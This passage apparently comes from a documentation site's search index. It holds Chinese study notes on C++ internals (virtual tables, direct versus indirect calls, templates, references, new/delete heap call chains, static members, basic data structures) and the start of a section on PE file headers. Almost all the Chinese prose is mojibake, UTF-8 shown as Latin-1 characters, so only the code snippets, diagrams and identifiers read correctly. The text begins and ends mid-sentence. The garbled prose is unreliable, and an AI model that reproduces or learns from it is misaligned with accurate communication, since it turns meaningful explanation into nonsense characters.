ä¸ºçˆ¶ç±»æ²¡æœ‰å®ç°è¿™ä¸ªæ“ä½œçš„æ„ä¹‰ï¼Œå¦‚æœçˆ¶ç±»æœ‰çº¯è™šå‡½æ•°ï¼ˆæŠ½è±¡ç±»ï¼‰ï¼Œé‚£ä¹ˆå­ç±»å¿…é¡»è¦å®ç°è¿™ä¸ªå‡½æ•°ã€‚\næ³¨æ„ï¼š\né€šè¿‡å¯¹è±¡è°ƒç”¨æ—¶ï¼Œvirtualå‡½æ•°ä¸æ™®é€šå‡½æ•°éƒ½æ˜¯E8 Callã€‚\né€šè¿‡æŒ‡é’ˆè°ƒç”¨æ—¶ï¼Œvirtualå‡½æ•°æ˜¯FF Callï¼Œä¹Ÿå°±æ˜¯é—´æ¥Callã€‚\nå½“ç±»ä¸­æœ‰è™šå‡½æ•°æ—¶ï¼Œä¼šå¤šä¸€ä¸ªå±æ€§ï¼Œ4ä¸ªå­—èŠ‚ã€‚\nå¤šå‡ºçš„å±æ€§æ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘ä¸€å¼ è¡¨ï¼Œé‡Œé¢å­˜å‚¨äº†æ‰€æœ‰è™šå‡½æ•°çš„åœ°å€ã€‚\nè™šè¡¨ ç°è±¡ï¼šåªè¦æœ‰è™šå‡½æ•°åœ¨çš„ç±»ä¸­ï¼Œæˆå‘˜çš„å¤§å°ä¼šå¤šå‡º4ä¸ªå­—èŠ‚ï¼ˆä¸ç®¡è™šå‡½æ•°æœ‰å‡ ä¸ªè™šå‡½æ•°ï¼‰\nåŸå› ï¼šæœ‰è™šå‡½æ•°æ—¶ï¼Œä¼šå°†è™šè¡¨çš„åœ°å€å­˜åˆ°å¯¹è±¡çš„å¼€å§‹çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆå‘˜å‡½æ•°æœ‰å‡ ä¸ªï¼Œè¿™ä¸ªè™šè¡¨å°±æœ‰å‡ ä¸ªè™šå‡½æ•°çš„åœ°å€ã€‚è™šè¡¨çš„å†…å®¹å°±æ˜¯æˆå‘˜å‡½æ•°çš„åœ°å€ã€‚\nä¸åŒæƒ…å†µä¸‹è™šè¡¨çš„ç»“æ„\næ— ç»§æ‰¿æ— å‡½æ•°è¦†ç›–\nstruct Base { public: virtual void Function_1() { printf(\"Function_1...\\n\"); } virtual void Function_2() { printf(\"Function_2...\\n\"); } virtual void Function_3() { printf(\"Function_3...\\n\"); } }; å•ç»§æ‰¿æ— å‡½æ•°è¦†ç›–\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_4() { printf(\"Sub:Function_4...\\n\"); } virtual void Function_5() { printf(\"Sub:Function_5...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } };\tå•ç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_1() { printf(\"Sub:Function_1...\\n\"); } virtual void Function_2() { printf(\"Sub:Function_2...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; å¤šç»§æ‰¿æ— å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base1,Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } virtual void Fn_6() { printf(\"Sub:Fn_6...\\n\"); } }; å¤šç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base1,Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Sub:Fn_3...\\n\"); } virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; å¤šé‡ç»§æ‰¿æ— å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } virtual void Fn_4() { printf(\"Base2:Fn_4...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } virtual void Fn_6() { printf(\"Sub:Fn_6...\\n\"); } }; å¤šé‡ç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_1() { printf(\"Base2:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; å¤šé‡ç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_1() { printf(\"Base2:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_5() { printf(\"Sub:Fn_5...\\n\"); } }; å¤šé‡ç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–\nstruct Base1 { public: virtual void Fn_1() { printf(\"Base1:Fn_1...\\n\"); } virtual void Fn_2() { printf(\"Base1:Fn_2...\\n\"); } }; struct Base2:Base1 { public: virtual void Fn_3() { printf(\"Base2:Fn_3...\\n\"); } }; struct Sub:Base2 { public: virtual void Fn_1() { printf(\"Sub:Fn_1...\\n\"); } virtual void Fn_3() { printf(\"Sub:Fn_3...\\n\"); } }; å¤§æ¦‚æ€»ç»“ï¼š\nåœ¨æ²¡æœ‰è¦†ç›–ä¸‹æƒ…å†µä¸‹ï¼Œç»§æ‰¿çˆ¶ç±»çš„è™šå‡½æ•°åœ¨è™šè¡¨ä¸­ä¼šåœ¨å¼€å§‹æ·»åŠ ï¼ˆä¸Šçˆ¶ä¸‹å­ï¼‰ æœ‰è¦†ç›–çš„è¯ï¼Œè°æœ€åè¦†ç›–å°±åœ¨è™šè¡¨ä¸­å†™è°çš„è™šå‡½æ•° å¤šä¸€ä¸ªç›´æ¥ç»§æ‰¿çš„çˆ¶ç±»ï¼Œå°±å¤šä¸€å¼ è™šè¡¨ åŠ¨æ€ç»‘å®š ç»‘å®šï¼šå°±æ˜¯å°†å‡½æ•°è°ƒç”¨ä¸åœ°å€å…³è”èµ·æ¥\nå‰æœŸç»‘å®šï¼šå°±æ˜¯åœ¨ç¼–è¯‘æ—¶å·²ç»æŠŠå‡½æ•°çš„åœ°å€å†™æ­»äº†ï¼ˆE8ç›´æ¥Callï¼‰ åæœŸç»‘å®š / åŠ¨æ€ç»‘å®š / è¿è¡ŒæœŸç»‘å®šï¼šå°±æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰ç¡®å®šå‡½æ•°çš„è°ƒç”¨ï¼ˆFFé—´æ¥Callï¼‰ åœ¨c++ä¸­åŠ¨æ€ç»‘å®šæ˜¯é€šè¿‡è™šè¡¨å®ç°çš„ï¼Œåªæœ‰virtualå‡½æ•°æ˜¯åŠ¨æ€ç»‘å®šçš„\nå¤šæ€ == åŠ¨æ€ç»‘å®š\nå®šä¹‰ï¼šä¸€ç§ç±»å‹ä½“ç°å‡ºä¸åŒè¡Œä¸ºï¼ˆå°±æ¯”å¦‚çˆ¶ç±»çš„æŒ‡é’ˆè®¿é—®å­ç±»çš„æ–¹æ³•ï¼‰\nå¦‚ä½•å®ç°çš„å‘¢ï¼Ÿï¼šåœ¨è°ƒç”¨å‡½æ•°æ—¶call [ebx]å½¢æˆé—´æ¥è°ƒç”¨ï¼Œå¹¶æ²¡æœ‰å†™æ­»è°ƒç”¨åœ°å€ï¼Œä¾¿æœ‰äº†å¤šæ€ã€‚\næ¨¡æ¿ å°±æ˜¯è‡ªå·±çš„å‡½æ•°åªèƒ½å¤„ç†ä¸€ç§ç±»å‹çš„æ•°æ®ï¼Œä½¿ç”¨æ¨¡æ¿åç¼–è¯‘å™¨ä¼šæ›¿ä½ ç”Ÿæˆå¯¹åº”ç±»å‹çš„å‡½æ•°ã€‚ç›¸åŒç±»å‹çš„ä»£ç ä½¿ç”¨æ¨¡æ¿ä¸ä¸ä½¿ç”¨æ¨¡æ¿åœ¨æ±‡ç¼–ç•Œé¢çœ‹æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œåªæ˜¯ç¼–è¯‘å™¨åšçš„ç±»å‹è½¬æ¢ã€‚\nå‡½æ•°æ¨¡æ¿çš„æ ¼å¼ï¼š\ntemplate \u003cclasså½¢å‚å, classå½¢å‚å, ......\u003eè¿”å›ç±»å‹å‡½æ•°å(å‚æ•°åˆ—è¡¨) { //å‡½æ•°ä½“ } ç±»æ¨¡æ¿çš„æ ¼å¼ä¸ºï¼š\ntemplate\u003cclasså½¢å‚å, classå½¢å‚å, ......\u003e classç±»å { } å¼•ç”¨ å½“ç¨‹åºä¸­æœ‰å€¼ä¸éœ€è¦å†è¢«é‡æ–°èµ‹å€¼ï¼Œå°±å¯ä»¥ä½¿ç”¨å¼•ç”¨\nvoid Test(int\u0026 x) { x = 1; //\u0026x = 20; //ä¸èƒ½é‡æ–°èµ‹å€¼ï¼Œxçš„ç±»å‹æ˜¯æŒ‡é’ˆ } int main() { int a = 2; Test(a); } ç‰¹ç‚¹ï¼š\nå¼•ç”¨ç±»å‹æ˜¯C++é‡Œé¢çš„ç±»å‹ï¼Œå¿…é¡»èµ‹åˆå§‹å€¼ å¼•ç”¨ç±»å‹åªèƒ½èµ‹å€¼ä¸€æ¬¡ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼ï¼ˆä¸å…è®¸å†æŒ‡å‘å…¶ä»–çš„å€¼ï¼Œâ€œä»ä¸€è€Œç»ˆâ€ï¼‰ å¼•ç”¨åªæ˜¯å˜é‡çš„ä¸€ä¸ªåˆ«å å¼•ç”¨å¯ä»¥ç†è§£æˆæ˜¯ç¼–è¯‘å™¨ç»´æŠ¤çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†å¹¶ä¸å ç”¨ç©ºé—´ï¼ˆå°±æ˜¯ä¸æŒ‡é’ˆç›¸æ¯”ï¼Œåœ¨æ±‡ç¼–çš„è§’åº¦ä¸‹æ˜¯å®Œå…¨ç›¸ç­‰çš„ï¼‰ ä½¿ç”¨å¼•ç”¨å¯ä»¥åƒæŒ‡é’ˆé‚£æ ·å»è®¿é—®ã€ä¿®æ”¹å¯¹è±¡çš„å†…å®¹ï¼Œä½†æ›´åŠ å®‰å…¨ åŠ constä¹‹åä¸ºå¸¸å¼•ç”¨ï¼Œä¸å¯æ”¹å¼•ç”¨çš„å€¼ã€‚ å‹å…ƒ å°±æ˜¯å‘é¢å‘è¿‡ç¨‹çš„å¦¥å\nå‹å…ƒå‡½æ•°ï¼š\nfriend void Printobject(Cobject* pobject); å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯æˆ‘çš„æœ‹å‹ï¼Œå¯ä»¥è®¿é—®æˆ‘çš„ä»»ä½•æˆå‘˜ï¼\nå‹å…ƒç±»ï¼š\nfriend class TestFriend(ç±»åç§°) TestFriendç±»ä¸­çš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰éƒ½å¯ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªç±»ä¸­çš„ç§æœ‰æˆå‘˜ï¼Œä½†åªæ˜¯å•å‘çš„ã€‚\nä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦å‹å…ƒå‡½æ•°ï¼š\nè¿ç®—ç¬¦é‡è½½çš„æŸäº›åœºåˆéœ€è¦ä½¿ç”¨å‹å…ƒ ä¸¤ä¸ªç±»è¦å…±äº«æ•°æ®çš„æ—¶å€™ å‹å…ƒå‡½æ•°å’Œç±»çš„æˆå‘˜å‡½æ•°çš„åŒºåˆ«\næˆå‘˜å‡½æ•°æœ‰thisæŒ‡é’ˆï¼Œè€Œå‹å…ƒå‡½æ•°æ²¡æœ‰thisæŒ‡é’ˆ å‹å…ƒå‡½æ•°æ˜¯ä¸èƒ½è¢«ç»§æ‰¿çš„ï¼Œå°±åƒçˆ¶äº²çš„æœ‹å‹æœªå¿…æ˜¯å„¿å­çš„æœ‹å‹ è¿ç®—ç¬¦é‡è½½ å°±æ˜¯é‡æ–°å®šä¹‰è¿ç®—ç¬¦ï¼Œè®©å®ƒæœ‰æ–°çš„å«ä¹‰ï¼ˆæœ‰ç‚¹å„¿åƒç»™è¿ç®—ç¬¦å®å®šä¹‰ä¸€ä¸‹ï¼‰ã€‚å…¶å®å°±æ˜¯å£°æ˜ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨ç‰¹å®šä½ç½®è°ƒç”¨å®ƒ\nvoid operator ++() { //â€¦â€¦ } x++ æ€»ç»“\nè¿ç®—ç¬¦é‡è½½å°±æ˜¯å‡½æ•°æ›¿æ¢ . :: ?: sizeof # ä¸èƒ½é‡è½½ newä¸delete åŸºæœ¬å‡½æ•°ï¼š\nmallocå‡½æ•°ï¼š\nmalloc -\u003e _nh_malloc_dbg -\u003e _heap_alloc_dbg -\u003e _heap_alloc_base -\u003e HeapAlloc newå‡½æ•°ï¼š\n_nh_malloc -\u003e _nh_malloc_dbg -\u003e _heap_alloc_dbg -\u003e _heap_alloc_base -\u003e HeapAlloc freeå‡½æ•°ï¼š\nfree -\u003e _free_dbg -\u003e _free_base -\u003e HeapFree deleteå‡½æ•°:\n_free_dbg -\u003e _free_base -\u003e HeapFree å…³ç³»ï¼š\nnew = malloc + æ„é€ å‡½æ•°\ndelete = free+ææ„å‡½æ•°\ndelete pæ˜¯åªåˆ é™¤ä¸€ä¸ªå †å—ï¼Œdelete[] pæ˜¯å°†æ‰€æœ‰çš„å †å—å…¨éƒ¨åˆ é™¤ï¼ˆéƒ½æ‰§è¡Œææ„å‡½æ•°ï¼‰\nç”¨æ³•ï¼š\nint* pi = new int[10]; delete[] pi; Person* p = new Person[2]; delete[] p; å¯¹è±¡æ‹·è´ æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼š\nCObject x(1,2); \u003c1\u003e CObject y(x); \u003c2\u003e CObject *p= new CObject(x); å°±æ˜¯ç›¸å½“äºyå°±æ˜¯xçš„ä¸€ä¸ªå‰¯æœ¬ï¼Œæœ¬è´¨æ˜¯å†…å­˜çš„å¤åˆ¶ã€‚ åªå¤åˆ¶æˆå‘˜çš„å€¼ï¼Œä¸å¤åˆ¶æˆå‘˜æ˜¯æŒ‡é’ˆæ—¶æŒ‡é’ˆæŒ‡å‘çš„å€¼ å†…éƒ¨ç±» å°†ä¸€ä¸ªç±»å®šä¹‰åˆ°å¦ä¸€ä¸ªç±»é‡Œé¢ï¼Œå®šä¹‰æ—¶éœ€è¦åœ¨å†…éƒ¨ç±»å‰é¢å†™ä¸Šå¤–éƒ¨ç±»çš„åå­—ã€‚\nå¤–éƒ¨ç±»ä¸å†…éƒ¨ç±»çš„å…³ç³»ï¼š\nå½¼æ­¤æ²¡æœ‰ç‰¹æƒ,äº’ç›¸ç‹¬ç«‹ å†…éƒ¨ç±»å—protected/privateå½±å“ å‘½åç©ºé—´ ç¬¦å·::â€‹æ˜¯ä½œç”¨åŸŸçš„ç¬¦å·ï¼ŒA::Bâ€‹ä¸ºBå±äºA\nnamespace n1 { ...... } namespace n2 { ...... } å¦‚æœå‡½æ•°åœ¨å…¨å±€å‘½åç©ºé—´é‚£ä¹ˆ::Testâ€‹å¯ä»¥è°ƒç”¨\nstaticå…³é”®è¯ é¢å‘è¿‡ç¨‹ï¼š\nstatic char szBuffer[0x10]={0} è¢«staticä¿®é¥°çš„å˜é‡ï¼ˆåœ¨å‡½æ•°å†…å®šä¹‰çš„ï¼‰è½¬å˜ä¸º**ç§æœ‰çš„å…¨å±€å˜é‡ï¼Œ**æ—¢åªèƒ½ä¾›å½“å‰å‡½æ•°ä½¿ç”¨çš„å…¨å±€å˜é‡ã€‚\né¢å‘å¯¹è±¡ï¼š\nåœ¨ç±»ä¸­åˆ›å»ºçš„staticå˜é‡ï¼šåªæ˜¯è¿™ä¸ªç±»å¯ä»¥è®¿é—®åˆ°çš„å…¨å±€å˜é‡ï¼Œè¿™ä¸ªç±»çš„å¤§å°ä¸ä¼šå› ä¸ºstaticå˜é‡è€Œæ”¹å˜ï¼ˆä½ ä»…ä»…åªæœ‰è®¿é—®å’Œä½¿ç”¨æƒï¼Œå®ƒä¸æ˜¯ä½ çš„ï¼‰\nå•å­æ¨¡å¼\næœ‰äº›æ—¶å€™æˆ‘ä»¬å¸Œæœ›å®šä¹‰çš„æŸäº›ç±»åªèƒ½æœ‰ä¸€ä¸ªå¯¹è±¡å­˜åœ¨ï¼ˆå› ä¸ºä¸€ä¸ªå¯¹è±¡å°±å·²ç»è¶³å¤Ÿäº†ï¼‰ï¼Œè¯¥å¦‚ä½•è¿›è¡Œé™åˆ¶å‘¢ï¼Ÿå®ç°æ€è·¯ï¼š\nç¦æ­¢å¯¹è±¡éšä¾¿è¢«åˆ›å»º ä¿è¯å¯¹è±¡åªæœ‰ä¸€ä»½å­˜åœ¨ æ€»ç»“ï¼š\nå‡ºç°åœ¨ç±»ä½“å¤–çš„å‡½æ•°å®šä¹‰ä¸èƒ½æŒ‡å®šå…³é”®å­—static; é™æ€æˆå‘˜ä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—®ï¼ŒåŒ…æ‹¬é™æ€æˆå‘˜å‡½æ•°è®¿é—®é™æ€æ•°æ®æˆå‘˜å’Œè®¿é—®é™æ€æˆå‘˜å‡½æ•°ï¼› éé™æ€æˆå‘˜å‡½æ•°å¯ä»¥ä»»æ„åœ°è®¿é—®é™æ€æˆå‘˜å‡½æ•°å’Œé™æ€æ•°æ®æˆå‘˜ï¼› é™æ€æˆå‘˜å‡½æ•°ä¸èƒ½è®¿é—®éé™æ€æˆå‘˜å‡½æ•°å’Œéé™æ€æ•°æ®æˆå‘˜ï¼› è°ƒç”¨ç±»çš„é™æ€æˆå‘˜å‡½æ•°çš„ä¸¤ç§æ–¹å¼ æ•°æ®ç»“æ„ Vector [ å…ƒç´ 1 ] [ å…ƒç´ 2 ] [ ... ] [ å…ƒç´ n ] [ ç©ºé—²ç©ºé—´1 ] [ ... ] [ ç©ºé—²ç©ºé—´n ] ç›¸å½“äºæ˜¯åŠ¨æ€æ˜¯æ•°ç»„ æœ¬è´¨å°±æ˜¯ä¸€ä¸ªæ•°ç»„ å¯ä»¥åŠ¨æ€æ‰©å……å®¹é‡ æ”¯æŒä¸‹æ ‡æ–¹æ³•ï¼ŒæŸ¥è¯¢æ€§èƒ½å¥½ æ–°å¢æ•°æ®å’Œåˆ é™¤æ•°æ®è¾ƒå·®ï¼ˆå› ä¸ºè¦å°†åé¢æ‰€æœ‰çš„æ•°æ®å‘å‰æˆ–å‘åç§»åŠ¨ï¼‰ é“¾è¡¨ ç»“æ„ï¼š\ngraph LR A[Head] --\u003e B(æ•°æ®:åœ°å€) B --\u003e C(æ•°æ®:åœ°å€) C --\u003e D(æ•°æ®:åœ°å€) D --\u003e E[Null] style A fill:#333,stroke:#333,stroke-width:2px style E fill:#333,stroke:#333,stroke-width:2px ç‰¹ç‚¹ï¼š\næ•°æ®åˆ†æ•£å­˜å‚¨ æŸ¥è¯¢æ€§èƒ½æ²¡æœ‰Vectorå¥½ æ–°å¢ä¸åˆ é™¤çš„æ€§èƒ½å¥½äºVector äºŒå‰æ ‘ ç»“æ„ï¼š\ngraph TD A[æ ¹èŠ‚ç‚¹] --\u003e B[å·¦å­èŠ‚ç‚¹] A --\u003e C[å³å­èŠ‚ç‚¹] B --\u003e D[å·¦å­™å­èŠ‚ç‚¹] B --\u003e E[å³å­™å­èŠ‚ç‚¹] C --\u003e F[å·¦å­™å­èŠ‚ç‚¹] C --\u003e G[å³å­™å­èŠ‚ç‚¹] å…¶å®å°±æ˜¯é“¾è¡¨ä¸­çš„åœ°å€æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æŒ‡å‘ä¸åŒçš„ä¸‹ä¸€ä¸ªé“¾è¡¨\néå†:\nA / \\ B C / \\ / \\ D E F G ï¼ˆ æ ¹ -\u003e å·¦ -\u003e å³ï¼‰å‰åºéå†çš„é¡ºåºå°±æ˜¯ï¼š A -\u003e B -\u003e D -\u003e E -\u003e C -\u003e F -\u003e G ï¼ˆå·¦ -\u003e æ ¹ -\u003e å³ï¼‰ä¸­åºéå†çš„é¡ºåºå°±æ˜¯ï¼š D -\u003e B -\u003e E -\u003e A -\u003e F -\u003e C -\u003e G ï¼ˆå·¦ -\u003e å³ -\u003e æ ¹ï¼‰ååºéå†çš„é¡ºåºå°±æ˜¯ï¼š D -\u003e E -\u003e B -\u003e F -\u003e G -\u003e C -\u003e A æœç´¢äºŒå‰æ ‘ graph TD A[15] --\u003e B[5] A --\u003e C[16] B --\u003e D[3] B --\u003e E[12] C --\u003e F[NULL] C --\u003e G[20] E --\u003e H[10] E --\u003e I[13] G --\u003e J[18] G --\u003e K[23] H --\u003e L[6] H --\u003e M[NULL] å°±æ˜¯å·¦å­èŠ‚ç‚¹æ¯”çˆ¶èŠ‚ç‚¹å°ï¼Œå³å­èŠ‚ç‚¹æ¯”çˆ¶èŠ‚ç‚¹å¤§ ç‰¹ç‚¹ï¼š æœ‰å¾ˆå¥½çš„æŸ¥è¯¢æ€§èƒ½ æœ‰å¾ˆå¥½çš„æ–°å¢å’Œåˆ é™¤çš„æ€§èƒ½ è‹¥å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ è‹¥å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æ’åºæ ‘ æœç´¢äºŒå‰æ ‘çš„åˆ é™¤ å¶å­èŠ‚ç‚¹ åˆ é™¤è¯¥èŠ‚ç‚¹ å°†çˆ¶èŠ‚ç‚¹ï¼ˆå·¦æˆ–è€…å³ï¼‰æŒ‡é’ˆç½®NULL åªæœ‰ä¸€ä¸ªå­æ ‘ åˆ é™¤è¯¥èŠ‚ç‚¹ å°†çˆ¶èŠ‚ç‚¹ï¼ˆå·¦æˆ–è€…å³ï¼‰æŒ‡é’ˆæŒ‡å‘å­æ ‘ å·¦å³å­æ ‘éƒ½æœ‰ ç”¨å³å­æ ‘æœ€å°çš„èŠ‚ç‚¹å–ä»£æºèŠ‚ç‚¹ å†é€’å½’åˆ é™¤æœ€å°èŠ‚ç‚¹ï¼ˆå°±æ˜¯æŠŠè¿™ä¸ªèŠ‚ç‚¹çš„å­èŠ‚ç‚¹å†è¿æ¥åˆ°è¿™ä¸ªèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸Šï¼‰ "},"title":"Windows BAS"},"/docs/windows/windows-beg/":{"data":{"":"","#":"PEæ–‡ä»¶ç»“æ„ æ€»ä½“ç»“æ„ â€‹â€‹\nç¨‹åºåœ¨å†…å­˜ä¸­æ˜¯åˆ†èŠ‚çš„ï¼Œæ¯ä¸€ä¸ªèŠ‚å­˜å‚¨ä¸åŒçš„æ•°æ®ï¼Œç¡¬ç›˜å¯¹é½(200h)ï¼Œå†…å­˜å¯¹é½(1000h)ã€‚å› ä¸ºç¨‹åºåœ¨ç¡¬ç›˜ä¸Šå’Œå†…å­˜ä¸­çš„çŠ¶æ€å¯èƒ½ç•¥æœ‰ä¸åŒ(ä»¥å‰çš„ç¨‹åºåœ¨å†…å­˜ä¸­ä¸åœ¨ç¡¬ç›˜ä¸Šï¼Œåœ¨å†…å­˜ä¸­èŠ‚ä¸èŠ‚ä¹‹é—´ä¼šæœ‰ä¸€ä¸ª\"æ‹‰ä¼¸\"è¿‡ç¨‹ï¼ŒèŠ‚ä¸èŠ‚ä¹‹é—´çš„ç©ºéš™å˜å¤§(å¡«å……0)ã€‚è€Œç°åœ¨çš„ç¨‹åºåˆ™å¹¶ä¸ä¼šã€‚)ï¼Œè¿™æ ·åšå¯ä»¥:\nèŠ‚çœç¡¬ç›˜ç©ºé—´ã€‚ å®ç°å¤šå¼€(å°†åªè¯»çš„èŠ‚ä¿ç•™ï¼Œå°†å¯è¯»å¯å†™çš„èŠ‚å¤šå¼€ï¼Œå¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´)ã€‚ å¤´çš„å¤§è‡´ç»“æ„å¦‚ä¸‹ï¼š\nç»“æ„ DOSå¤´ æ ‡å‡†PEå¤´ å¯é€‰PEå¤´ èŠ‚è¡¨ ç»“æ„è§£é‡Šï¼š\nDOSå¤´ï¼ˆIMAGE_DOS_HEADERï¼‰æœ€æ—©æ˜¯ä¸º16ä½çš„DOSç¨‹åºè®¾è®¡çš„ï¼Œå› æ­¤åŒ…å«äº†ä¸€äº›ä¸DOSç›¸å…³çš„ä¿¡æ¯ã€‚ç°ä»£çš„Windowså¯æ‰§è¡Œæ–‡ä»¶ï¼ˆPEæ ¼å¼ï¼‰ä»ç„¶ä¿ç•™äº†DOSå¤´ï¼Œä»¥ä¾¿åœ¨DOSç¯å¢ƒä¸‹è¿è¡Œæ—¶èƒ½æ˜¾ç¤ºâ€œæ­¤ç¨‹åºä¸èƒ½åœ¨DOSæ¨¡å¼ä¸‹è¿è¡Œâ€çš„æ¶ˆæ¯ã€‚DOSå¤´çš„ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯WORD e_magicï¼Œé€šå¸¸ä¸º0x5A4Dï¼Œå³å­—ç¬¦â€œMZâ€ï¼Œç”¨äºæ ‡è¯†è¿™æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„DOSå¯æ‰§è¡Œæ–‡ä»¶å¤´ã€‚å¦ä¸€ä¸ªé‡è¦å­—æ®µæ˜¯DWORD e_lfanewï¼Œå®ƒä¿å­˜äº†PEå¤´ï¼ˆIMAGE_NT_HEADERSï¼‰åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡ã€‚ç¨‹åºåœ¨è§£æPEæ–‡ä»¶æ—¶ï¼Œä¼šä»e_lfanewå­—æ®µæ‰¾åˆ°PEå¤´çš„ä½ç½®ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨e_lfanewå’ŒPEæ ‡è¯†ç¬¦ï¼ˆâ€œPEâ€ï¼Œå³0x5045ï¼‰ä¹‹é—´çš„éƒ¨åˆ†æ•°æ®é€šå¸¸è¢«è®¤ä¸ºæ˜¯â€œåƒåœ¾æ•°æ®â€ï¼Œè¿™äº›æ•°æ®åœ¨ç°ä»£Windowsç³»ç»Ÿä¸­æ²¡æœ‰å®é™…ç”¨é€”ï¼Œåªæ˜¯ä¸ºäº†ä¿æŒæ–‡ä»¶ç»“æ„çš„å…¼å®¹æ€§ã€‚\n1ã€DOSå¤´ï¼š\tWORD e_magic *\t\"MZæ ‡è®°\" ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºå¯æ‰§è¡Œæ–‡ä»¶.\tDWORD e_lfanew; *\tPEå¤´ç›¸å¯¹äºæ–‡ä»¶çš„åç§»ï¼Œç”¨äºå®šä½æ ‡å‡†PEå¤´ åœ¨æ‰¾åˆ°PEæ ‡è¯†ç¬¦â€œPE\\0\\0â€ï¼ˆ0x50450000ï¼‰åï¼Œæ¥ä¸‹æ¥å°±æ˜¯ï¼ˆIMAGE_NT_HEADERSï¼‰NTå¤´çš„å†…å®¹ã€‚\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; // æ–‡ä»¶ç­¾åï¼Œé€šå¸¸ä¸º'PE\\0\\0'ï¼ˆ0x00004550ï¼‰ï¼Œç”¨äºæ ‡è¯†è¿™æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„PEæ–‡ä»¶ IMAGE_FILE_HEADER FileHeader; // æ ‡å‡†PEå¤´ï¼ŒåŒ…å«æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ IMAGE_OPTIONAL_HEADER OptionalHeader; // å¯é€‰PEå¤´ï¼ŒåŒ…å«åŠ è½½å’Œè¿è¡Œæ—¶çš„è¯¦ç»†ä¿¡æ¯ } IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS; æ–‡ä»¶ç­¾åç´§éšå…¶åçš„æ˜¯FileHeaderï¼ˆIMAGE_FILE_HEADERï¼‰ï¼Œé€šå¸¸è¢«ç§°ä¸ºæ 